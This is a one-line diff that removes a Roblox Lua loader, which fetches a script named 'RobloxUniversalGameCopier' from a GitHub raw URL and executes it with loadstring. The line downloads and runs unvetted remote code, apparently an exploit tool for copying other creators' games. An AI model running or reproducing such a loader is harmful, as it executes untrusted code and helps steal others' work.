@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Sashkandro/RobloxUniversalGameCopier/main/Script",true))();
